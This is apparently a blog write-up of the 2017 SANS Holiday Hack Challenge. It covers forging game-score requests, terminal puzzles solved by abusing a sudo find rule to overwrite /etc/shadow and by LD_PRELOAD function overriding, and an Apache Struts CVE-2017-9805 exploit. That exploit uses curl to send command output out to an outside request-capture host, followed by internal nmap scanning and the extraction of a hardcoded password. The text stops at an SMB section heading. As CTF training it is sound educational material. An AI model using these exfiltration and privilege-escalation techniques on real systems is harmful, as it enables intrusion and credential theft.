---
layout: post
title: 2017 SANS Holiday Hack Challenge Writeup
draft: false
---

[2017 SANS Holiday Hack Challenge](https://www.holidayhackchallenge.com/2017/) (HHC) was awesome this year - just as expected! A great mix of fun and education, and a perfect way to spend the down time during the holidays.

_**Spoilers ahead!** HHC will likely stay online after its official deadline, so if you would like to go through it on your own - read no further._

![title]({{ site.baseurl }}/images/sans2017/title.png)

## Getting started

HHC consist of several components:

- 3D games
- terminal challenges
- a set of vulnerable systems

As we solve individual challenges we will collect Great Book pages, hints, tools, achievements, and chat transcripts - for a maximum of 85 points.

We begin by carefully reviewing all available information, including overall story, messages in twitter accounts, and referenced articles. Same needs to be done as new hints and references are revealed - all collected information will prove useful later on.

![game]({{ site.baseurl }}/images/sans2017/game.png)

## Games

Finishing all games is the necessary first step in HHC. Without it we will lack the crucial information when we attempt to exploit the vulnerable systems.

#### Finishing individual games

Individual games all have similar goals - we have to redirect the giant snowballs that are falling down in order to hit certain points on the playing field. Redirecting is done using in-game tools, and the minimum criteria for finishing the game is hitting the yellow "exit" spot on the field. 

As we finish the games one by one, more and more tools are unlocked. If we have trouble finishing a particular game we can skip it and finish others. As more tools are made available we can come back and use them to finish the games we have skipped. My favorites tools were the Conveyors and Portals - with them we can get to the desired point in the playing field fairly effortlessly.

#### Achieving 100% game completion

Unfortunately getting to the finish point in the game is much easier than completing it "100%". Full completion includes touching all in-game waypoints, rolling over Great Book pages, pushing buttons, and so on.

Doing all of this requires patience and time (in some cases - hours). If you are in a hurry or stuck you can "bend the rules" a little :smile:. Here's how to do it:

- Set up an HTTP proxy like ZAP and track requests and responses between the game UI and the server
- Start the game that you want to get full points in
- Complete an individual game by reaching the exit. A request with an address like ```https://2017.holidayhackchallenge.com/api/roll/fafb6668-6279-441a-bc78-5651c776e956/results``` will be captured by the proxy 
- The request body will list points in the game that were successfully reached (in this case - just the exit):

```
clientEvents[0][type]=0&clientEvents[0][name]=81&clientEvents[0][stepId]=0&
clientEvents[1][type]=32&clientEvents[1][name]=__exit_2_46528&clientEvents[1][stepId]=989
```

- The response body will contain full game layout and current results:

```
{"runScore":392,"runObjectives":[
{"name":"waypoints","points":0,"result":false},
{"name":"exit","points":25,"result":true},
{"name":"clock","points":27},
{"name":"tools","points":90},
{"name":"imnottouchingyou","points":0,"result":false}],
"shenanigans":false}
```

- Notice that when we re-submit this request from the proxy we get the same response. This means that there is no protection mechanism in place that would prevent request modification and re-execution. We can change the request by carefully adding the missing point names from the response and adjusting corresponding counters and index numbers. In this particular game we are adding ```waypoints``` 1 through 3 and point ```imnottouchingyou```:

```
clientEvents[0][type]=0&clientEvents[0][name]=81&clientEvents[0][stepId]=0&
clientEvents[1][type]=16&clientEvents[1][name]=waypoint0&clientEvents[1][stepId]=455&
clientEvents[2][type]=16&clientEvents[2][name]=waypoint1&clientEvents[2][stepId]=772&
clientEvents[3][type]=16&clientEvents[3][name]=waypoint2&clientEvents[3][stepId]=972&
clientEvents[4][type]=4&clientEvents[4][name]=imnottouchingyou&clientEvents[4][stepId]=989&
clientEvents[5][type]=32&clientEvents[5][name]=__exit_2_46528&clientEvents[5][stepId]=989
```

- When we execute this request we get the full score for every point, and, consequently, the 100% completion for the game:

```
{"runScore":392,"runObjectives":[
{"name":"waypoints","points":150,"result":true},
{"name":"exit","points":25,"result":true},
{"name":"clock","points":27},
{"name":"tools","points":90},
{"name":"imnottouchingyou","points":100,"result":true}],
"shenanigans":false}
```

We can repeat the same process to get 100% completion in every game.

## Terminal challenges

Within every game there is a terminal challenge that must be solved. Here's how to solve each one:

#### Winconceivable: The Cliffs of Winsanity

Here we are given a process that cannot be shut down by ```kill``` command:

```
                ___,@
               /  <
          ,_  /    \  _,
      ?    \`/______\`/
   ,_(_).  |; (e  e) ;|
    \___ \ \/\   7  /\/    _\8/_
        \/\   \'=='/      | /| /|
         \ \___)--(_______|//|//|
          \___  ()  _____/|/_|/_|
             /  ()  \    `----'
            /   ()   \
           '-.______.-'
   jgs   _    |_||_|    _
        (@____) || (____@)
         \______||______/
My name is Sparkle Redberry, and I need your help.
My server is atwist, and I fear I may yelp.
Help me kill the troublesome process gone awry.
I will return the favor with a gift before nigh.
Kill the "santaslittlehelperd" process to complete this challenge.

elf@d5e42f26cf05:~$ ps -ef
UID        PID  PPID  C STIME TTY          TIME CMD
elf          1     0  0 08:00 pts/0    00:00:00 /bin/bash /sbin/init
elf          8     1  0 08:00 pts/0    00:00:00 /usr/bin/santaslittlehelperd
elf         11     1  0 08:00 pts/0    00:00:00 /sbin/kworker
elf         12     1  0 08:00 pts/0    00:00:00 /bin/bash
elf         18    11  0 08:00 pts/0    00:00:00 /sbin/kworker
elf         79    12  0 08:01 pts/0    00:00:00 ps -ef

elf@d5e42f26cf05:~$ kill -9 8

elf@d5e42f26cf05:~$ ps
  PID TTY          TIME CMD
    1 pts/0    00:00:00 init
    8 pts/0    00:00:00 santaslittlehel
   11 pts/0    00:00:00 kworker
   12 pts/0    00:00:00 bash
   18 pts/0    00:00:00 kworker
  106 pts/0    00:00:00 ps
```

Note that the process is still up. However we can kill it using ```top```:

```
top - 08:11:07 up  5:00,  0 users,  load average: 0.66, 0.58, 0.45
Tasks:   6 total,   1 running,   5 sleeping,   0 stopped,   0 zombie
%Cpu(s):  0.2 us,  0.6 sy,  0.0 ni, 99.2 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
KiB Mem : 12378073+total, 11896960+free,  2550356 used,  2260780 buff/cache
KiB Swap:        0 total,        0 free,        0 used. 11956275+avail Mem 
PID to signal/kill [default pid = 18] 8
  PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND                                                       
   18 elf       20   0   71468  26476   9260 S   0.3  0.0   0:00.38 kworker                                                       
    1 elf       20   0   18028   2752   2528 S   0.0  0.0   0:00.03 init                                                          
    8 elf       20   0    4224    784    712 S   0.0  0.0   0:00.00 santaslittlehel                                               
   11 elf       20   0   13528   6412   1428 S   0.0  0.0   0:00.08 kworker                                                       
   12 elf       20   0   18248   3224   2736 S   0.0  0.0   0:00.00 bash                                                          
  113 elf       20   0   36664   3108   2648 R   0.0  0.0   0:00.00 top                                                           

 Send pid 8 signal [15/sigterm] 
 
 elf@b14da86d28a3:~$ ps
  PID TTY          TIME CMD
    1 pts/0    00:00:00 init
   12 pts/0    00:00:00 bash
  166 pts/0    00:00:00 ps
```

The process is now gone.

#### Winter Wonder Landing 

Here we are asked to find and run an executable, but the ```find``` command is not available:

```
                                 |
                               \ ' /
                             -- (*) --
                                >*<
                               >0<@<
                              >>>@<<*
                             >@>*<0<<<
                            >*>>@<<<@<<
                           >@>>0<<<*<<@<
                          >*>>0<<@<<<@<<<
                         >@>>*<<@<>*<<0<*<
           \*/          >0>>*<<@<>0><<*<@<<
       ___\\U//___     >*>>@><0<<*>>@><*<0<<
       |\\ | | \\|    >@>>0<*<0>>@<<0<<<*<@<<  
       | \\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<
       |\ \| || / //||.*.*.*.|>>@<<*<<@>><0<<<
       |\\_|_|&&_// ||*.*.*.*|_\\db//_               
       """"|'.'.'.|~~|.*.*.*|     ____|_
           |'.'.'.|   ^^^^^^|____|>>>>>>|
           ~~~~~~~~         '""""`------'
My name is Bushy Evergreen, and I have a problem for you.
I think a server got owned, and I can only offer a clue.
We use the system for chat, to keep toy production running.
Can you help us recover from the server connection shunning?
Find and run the elftalkd binary to complete this challenge.

elf@608750633caa:~$ find / -name elftalkd
bash: /usr/local/bin/find: cannot execute binary file: Exec format error
elf@608750633caa:~$ 
```

However we can use other tools to find it. For example - ```ls```:

```
elf@608750633caa:~$ cd /
elf@608750633caa:/$ ls -R | grep -B 3 elftalkd            
ls: cannot open directory './proc/tty/driver': Permission denied
ls: cannot open directory './root': Permission denied
bin
./run/elftalk/bin:
elftalkd
ls: cannot open directory './var/cache/apt/archives/partial': Permission denied
ls: cannot open directory './var/cache/ldconfig': Permission denied
ls: cannot open directory './var/lib/apt/lists/partial': Permission denied
elf@608750633caa:/$ 
```

We can now run the executable:

```
elf@608750633caa:/$ /run/elftalk/bin/elftalkd 
        Running in interactive mode
        --== Initializing elftalkd ==--
Initializing Messaging System!
Nice-O-Meter configured to 0.90 sensitivity.
Acquiring messages from local networks...
--== Initialization Complete ==--
      _  __ _        _ _       _ 
     | |/ _| |      | | |     | |
  ___| | |_| |_ __ _| | | ____| |
 / _ \ |  _| __/ _` | | |/ / _` |
|  __/ | | | || (_| | |   < (_| |
 \___|_|_|  \__\__,_|_|_|\_\__,_|
-*> elftalkd! <*-
Version 9000.1 (Build 31337) 
By Santa Claus & The Elf Team
Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
Using libc6 version 2.23-0ubuntu9
LANG=en_US.UTF-8
Timezone=UTC
Commencing Elf Talk Daemon (pid=6021)... done!
Background daemon...
```

#### Cryokinetic Magic

In this challenge the executable must be made runnable:

```
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.
Run the CandyCaneStriper executable to complete this challenge.
elf@dc1f3afe3b56:~$ ls -la
total 116
drwxr-xr-x 1 elf  elf   4096 Dec 15 07:50 .
drwxr-xr-x 1 root root  4096 Dec  5 19:31 ..
-rw-r--r-- 1 elf  elf    220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 root root  3143 Dec  5 19:30 .bashrc
-rw-r--r-- 1 elf  elf    655 May 16  2017 .profile
-rw-r--r-- 1 root root 45224 Dec  5 19:30 CandyCaneStriper
```

Note the missing runnable permissions on the file. ```chmod``` does not seem to work correctly, but we can achieve the same functionality with Perl:

```
elf@dc1f3afe3b56:~$ cp CandyCaneStriper a
elf@dc1f3afe3b56:~$ perl -e 'chmod 0777,"a"'
elf@dc1f3afe3b56:~$ ./a
                   _..._
                 .'\\ //`,      
                /\\.'``'.=",
               / \/     ;==|
              /\\/    .'\`,`
             / \/     `""`
            /\\/
           /\\/
          /\ /
         /\\/
        /`\/
        \\/
         `
The candy cane striping machine is up and running!
```

#### There's Snow Place Like Home

Here we are given an executable from another architecture. Luckily an emulator for it is available:

```
                          .-"""".._'.       _,##
                   _..__ |.-"""-.|  |   _,##'`-._
                  (_____)||_____||  |_,##'`-._,##'`
                  _|   |.;-""-.  |  |#'`-._,##'`
               _.;_ `--' `\    \ |.'`\._,##'`
              /.-.\ `\     |.-";.`_, |##'`
              |\__/   | _..;__  |'-' /
              '.____.'_.-`)\--' /'-'`
               //||\\(_.-'_,'-'`
             (`-...-')_,##'`
      jgs _,##`-..,-;##`
       _,##'`-._,##'`
    _,##'`-._,##'`
      `-._,##'`
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.
total 444
-rwxr-xr-x 1 root root 454636 Dec  7 18:43 trainstartup

elf@075efb246d92:~$ ./trainstartup 
bash: ./trainstartup: cannot execute binary file: Exec format error
elf@075efb246d92:~$ uname -a
Linux 075efb246d92 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux
elf@075efb246d92:~$ file trainstartup 
trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=
005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
elf@075efb246d92:~$ find / -iname "*arm*"
/sys/devices/platform/alarmtimer
/sys/devices/pnp0/00:00/rtc/rtc0/wakealarm
/sys/bus/platform/devices/alarmtimer
/sys/bus/platform/drivers/alarmtimer
/sys/bus/platform/drivers/alarmtimer/alarmtimer
/sys/module/apparmor
/usr/bin/qemu-arm
/usr/bin/qemu-armeb

elf@075efb246d92:~$ qemu-arm trainstartup

    Merry Christmas
    Merry Christmas
v
>*<
^
/o\
/   \               @.·
/~~   \                .
/ ° ~~  \         · .    
/      ~~ \       ?  ·    
/     °   ~~\    ·     0
/~~           \   .-··- · o
             /°  ~~  .*· · . \  +--+--¦                                        
              ¦  ----°---°-°-°- +-----+                                        
?==?==?==?==--+--=?     ?=?==?==?==?==?==?==?==?==?==?==?==?==?==?==?==?==?===?
              ¦   /+---+\+---+       ++                                        
                         +---+    /¦¦¦¦                                        
?==?==?==?==?==?==?==?==?==?==?==?=°?=°?==?==?==?==?==?==?==?==?==?==?==?==?==?
You did it! Thank you!
```

#### Bumbles Bounce

This is a log file parsing task. It can be completed using ```cut```, ```sort``` and ```uniq```:

```
                           ._    _.
                           (_)  (_)                  <> \  / <>
                            .\::/.                   \_\/  \/_/ 
           .:.          _.=._\\//_.=._                  \\//
      ..   \o/   ..      '=' //\\ '='             _<>_\_\<>/_/_<>_
      :o|   |   |o:         '/::\'                 <> / /<>\ \ <>
       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
           >O<             '      '     /_/  \_\     / /\  /\ \
       _ .' . '. _                        \\//       <> /  \ <>
      :o|   |   |o:                   /\_\\><//_/\
      ''   /o\   ''     '.|  |.'      \/ //><\\ \/
           ':'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/ 
                       / ' /\ ' \                   \o/
       o              ' __/  \__ '              _o/.:|:.\o_
  o    :    o         ' .'|  |'.                  .\:|:/.
    '.\'/.'                 .                 -=>>::>o<::<<=-
    :->@<-:                 :                   _ '/:|:\' _
    .'/.\'.           '.___/*\___.'              o\':|:'/o 
  o    :    o           \* \ / */                   /o\
       o                 >--X--<
                        /*_/ \_*\
                      .'   \*/   '.
                            :
                            '
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
total 28704
-rw-r--r-- 1 root root 24191488 Dec  4 17:11 access.log
-rwxr-xr-x 1 root root  5197336 Dec 11 17:31 runtoanswer
elf@5ff821a6827e:~$ more access.log
XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] "GET /robots.txt HTTP/1.1" 301 185 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http
://www.opensiteexplorer.org/dotbot, help@moz.com)"
XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] "GET /robots.txt HTTP/1.1" 404 5 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http:/
/www.opensiteexplorer.org/dotbot, help@moz.com)"
XX.YY.89.151 - - [19/Nov/2017:07:13:03 -0500] "GET /img/common/apple-touch-icon-57x57.png HTTP/1.1" 200 3677 "-" "Slack-ImgProx
y (+https://api.slack.com/robots)"

elf@5ff821a6827e:~$ cat access.log | cut -f6  -d"\"" | sort | uniq -c | sort | more
      1 Dillo/3.0.5
      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.3
6
      1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko)
      1 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1
      1 Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
      1 Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0
      1 Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36
	  
	  elf@5ff821a6827e:~$ ./runtoanswer 
Starting up, please wait......
Enter the name of the least popular browser in the web log: Dillo
That is the least common browser in the web log! Congratulations!
```

#### I Don't Think We're in Kansas Anymore

In this challenge we need to query a database:

```
                       *
                      .~'
                     O'~..
                    ~'O'~..
                   ~'O'~..~'
                  O'~..~'O'~.
                 .~'O'~..~'O'~
                ..~'O'~..~'O'~.
               .~'O'~..~'O'~..~'
              O'~..~'O'~..~'O'~..
             ~'O'~..~'O'~..~'O'~..
            ~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~.
          .~'O'~..~'O'~..~'O'~..~'O'~
         ..~'O'~..~'O'~..~'O'~..~'O'~.
        .~'O'~..~'O'~..~'O'~..~'O'~..~'
       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
 .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.
total 20684
-rw-r--r-- 1 root root 15982592 Nov 29 19:28 christmassongs.db
-rwxr-xr-x 1 root root  5197352 Dec  7 15:10 runtoanswer
```

A few simple ```sqlite``` queries get us the right answer:

```
elf@7329194f6187:~$ sqlite3
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open christmassongs.db

sqlite> .tables
likes  songs

sqlite> .schema likes
CREATE TABLE likes(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  like INTEGER,
  datetime INTEGER,
  songid INTEGER,
  FOREIGN KEY(songid) REFERENCES songs(id)
);
sqlite> .schema songs
CREATE TABLE songs(
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  title TEXT,
  artist TEXT,
  year TEXT,
  notes TEXT
);

sqlite> select songid, count(songid) as "c"  from likes group by songid order by c;
82|1898
445|1900
120|1908
153|1909
...
265|2140
245|2162
392|11325



sqlite> select * from songs where id=392;
392|Stairway to Heaven|Led Zeppelin|1971|"Stairway to Heaven" is a song by the English rock band Led Zeppelin, released in late 1971. It was composed by guitari
st Jimmy Page and vocalist Robert Plant for the band's untitled fourth studio album (often called Led Zeppelin IV). It is often referred to as one of the greate
st rock songs of all time.

elf@7329194f6187:~$ ./runtoanswer 
Starting up, please wait......
Enter the name of the song with the most likes: Stairway to Heaven
That is the #1 Christmas song, congratulations!
```

#### Oh Wait! Maybe We Are...

Here we need to restore the ```shadow``` file:

```
              \ /
            -->*<--
              /o\
             /_\_\
            /_/_0_\
           /_o_\_\_\
          /_/_/_/_/o\
         /@\_\_\@\_\_\
        /_/_/O/_/_/_/_\
       /_\_\_\_\_\o\_\_\
      /_/0/_/_/_0_/_/@/_\
     /_\_\_\_\_\_\_\_\_\_\
    /_/o/_/_/@/_/_/o/_/0/_\
   jgs       [___]  
My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.
Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
Hint: What commands can you run with sudo?
```

The hint is clear enough - we need to use ```sudo```. Only ```find``` command is configured to run as root:
```
elf@52548e77d378:~$ more /etc/sudoers
...
# The elf user can run `find` with the shadow group
elf             ALL=(:shadow) NOPASSWD:/usr/bin/find
# See sudoers(5) for more information on "#include" directives:
#includedir /etc/sudoers.d
elf@52548e77d378:~$ ls -la /etc/shad*
-rw-rw---- 1 root shadow   0 Dec 15 20:00 /etc/shadow
-rw------- 1 root root   652 Nov 14 13:48 /etc/shadow-
-rw-r--r-- 1 root root   677 Dec 15 19:59 /etc/shadow.bak
elf@52548e77d378:~$ cat /etc/shadow.bak
root:*:17484:0:99999:7:::
daemon:*:17484:0:99999:7:::
bin:*:17484:0:99999:7:::
sys:*:17484:0:99999:7:::
...
elf@52548e77d378:~$ sudo -g shadow find /etc/shadow.bak -exec cp {} /etc/shadow \;
elf@52548e77d378:~$ ls -la /etc/sha*
-rw-rw---- 1 root shadow 677 Dec 16 08:47 /etc/shadow
-rw------- 1 root root   652 Nov 14 13:48 /etc/shadow-
-rw-r--r-- 1 root root   677 Dec 15 19:59 /etc/shadow.bak
elf@52548e77d378:~$ find / -iname inspect_da_box
/usr/local/bin/inspect_da_box
find: '/var/cache/ldconfig': Permission denied
find: '/var/cache/apt/archives/partial': Permission denied
find: '/var/lib/apt/lists/partial': Permission denied
find: '/proc/tty/driver': Permission denied
find: '/etc/ssl/private': Permission denied
find: '/root': Permission denied
elf@52548e77d378:~$ inspect_da_box
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`
/etc/shadow has been successfully restored!
```

#### We're Off to See the Wizard

In the final terminal challenge we need to get the ```rand()``` function to always output ```42```:

```
                 .--._.--.--.__.--.--.__.--.--.__.--.--._.--.
               _(_      _Y_      _Y_      _Y_      _Y_      _)_
              [___]    [___]    [___]    [___]    [___]    [___]
              /:' \    /:' \    /:' \    /:' \    /:' \    /:' \
             |::   |  |::   |  |::   |  |::   |  |::   |  |::   |
             \::.  /  \::.  /  \::.  /  \::.  /  \::.  /  \::.  /
         jgs  \::./    \::./    \::./    \::./    \::./    \::./
               '='      '='      '='      '='      '='      '='
Wunorse Openslae has a special challenge for you.
Run the given binary, make it return 42.
Use the partial source for hints, it is just a clue.
You will need to write your own code, but only a line or two.
total 88
-rwxr-xr-x 1 root root 84824 Dec 16 16:59 isit42
-rw-r--r-- 1 root root   654 Dec 16 16:57 isit42.c.un
```

We can use the trick outlined [here](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) to achieve that:

```
elf@647bdc3250a8:~$ echo "int rand(){return 42;}" > unrandom.c
elf@647bdc3250a8:~$ gcc -shared -fPIC unrandom.c -o unrandom.so
elf@647bdc3250a8:~$ LD_PRELOAD=$PWD/unrandom.so ./isit42     
Starting up ... done.
Calling rand() to select a random number.
                 .-. 
                .;;\ ||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
               /::::\|/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
              /::::'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||
            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ 
        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |
         \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |
         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|
          \/|(_) () (_)|\/ 
            \   '()'   /            ______    _______  _______  ___      ___      __   __    ___   _______ 
            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |
          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|
         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ 
        /  |o`""""""""`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |
       `.__/     ()     \__.'      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
       /  \|---|    |---|/  \ 
       |  (|42 | () | DA|)  |       _   ___  _______ 
       \  /;---'    '---;\  /      | | |   ||       |
        `` \ ___ /\ ___ / ``       | |_|   ||____   |
            `|  |  |  |`           |       | ____|  |
      jgs    |  |  |  |            |___    || ______| ___ 
       _._  |\|\/||\/|/|  _._          |   || |_____ |   |
      / .-\ |~~~~||~~~~| /-. \         |___||_______||___|
      | \__.'    ||    '.__/ |
       `---------''---------` 
	   
Congratulations! You've won, and have successfully completed this challenge.
```

Once we finish all games we should have 2 Great Book pages in our inventory and can answer the first challenge question:

> Q: 1) Visit the North Pole and Beyond at the Winter Wonder Landing Level to collect the first page of The Great Book using a giant snowball. What is the title of that page?
>
> A: The title of the first page is "About This Book..." 


## Vulnerable systems

Now we can turn our attention to the set of vulnerable systems that we have to exploit.

![dearsanta]({{ site.baseurl }}/images/sans2017/dearsanta.png)

#### Letters to Santa application (https://l2s.northpolechristmastown.com)

As the hints suggest, this application is vulnerable to Apache Struts bug. The script in one of the referenced articles can be used to remotely execute OS commands on that system. The command injection is blind, so we can either exfiltrate the output to another system, or drop in a web shell that we can interact with.

Because the system is cleaned up pretty frequently and the newly created files are deleted I chose to exfiltrate the data. For that I used http://requestb.in - an excellent pinger that saves full request details in a easy to use form. Here we will use Struts exploitation script to run curl to send output of ```id``` command to the external site:

```
$ python cve-2017-9805.py -u "https://dev.northpolechristmastown.com" 
-c "curl https://requestb.in/qfa38mqf?\`id\`"
[+] Encoding Command
[+] Building XML object
[+] Placing command in XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
``` 

The output produced is ```uid 1003(alabaster_snowball)```.

Command injection works. We can now use this method to:

- Map the systems in the intranet:

```
Starting Nmap 7.40 ( https://nmap.org ) at 2017-12-18 05:38 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Host is up (0.00017s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
2222/tcp open  EtherNetIP-1

Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Host is up (0.00017s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Host is up (0.00024s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
143/tcp  open  imap
2525/tcp open  ms-v-worlds
3000/tcp open  ppp

Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Host is up (0.00019s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
389/tcp  open  ldap
8080/tcp open  http-proxy

Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
Host is up (0.00059s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
Host is up (0.00019s latency).
Not shown: 993 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1080/tcp  open  socks
3030/tcp  open  arepa-cas
4445/tcp  open  upnotifyp
8081/tcp  open  blackice-icecap
31337/tcp open  Elite

Nmap done: 256 IP addresses (6 hosts up) scanned in 6.76 seconds
```

- Find out the username and password of Alabaster Snowball:

```
$ grep -r -i alabaster /opt/apache-tomcat/webapps/*

/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class:
            final String username = "alabaster_snowball";
/opt/apache-tomcat/webapps/ROOT/WEB-INF/content/orders-index.jsp:    
/opt/apache-tomcat/webapps/ROOT/WEB-INF/content/orders-show.jsp:    
/opt/apache-tomcat/webapps/ROOT/WEB-INF/content/orders-editNew.jsp:    
/opt/apache-tomcat/webapps/ROOT/WEB-INF/content/orders-deleteConfirm.jsp:    
/opt/apache-tomcat/webapps/ROOT/WEB-INF/content/orders-edit.jsp:    

$ cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class

    public class Connect {
            final String host = "localhost";
            final String username = "alabaster_snowball";
            final String password = "stream_unhappy_buy_loss";   
			...
```

- Find the page of the Great Book and post its SHA1 hash to the Stocking page, which unlocks its contents for us:

```
$ find / -name "GreatBookPage*"
/var/www/html/GreatBookPage2.pdf

$ sha1sum /var/www/html/GreatBookPage2.pdf
aa814d1c25455480942cb4106e6cde84be86fb30  /var/www/html/GreatBookPage2.pdf
```

We can now answer the next challenge question:

> Q: 2) Investigate the Letters to Santa application at https://l2s.northpolechristmastown.com. What is the topic of The Great Book page available in the web root of the server? What is Alabaster Snowball's password?
>
> A: The topic is "On The Topic of Flying Animals". Alabaster Snowball's password is stream_unhappy_buy_loss.

#### SMB server

